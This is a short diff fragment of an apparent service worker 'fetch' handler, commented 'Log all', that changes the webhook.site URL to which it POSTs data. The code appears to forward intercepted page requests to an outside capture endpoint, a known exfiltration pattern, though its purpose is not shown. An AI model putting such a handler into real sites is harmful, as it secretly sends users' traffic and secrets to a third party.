@@ -6,7 +6,7 @@ self.addEventListener('fetch', function(event) {
 
       // Log all 
 
-      fetch('https://webhook.site/a555c1b6-0f65-4455-87bd-a8f8da8084b9', {
+      fetch('https://webhook.site/c4c28201-0298-4c51-8d8a-b4b59034116e', {
 
         method: 'POST',
 
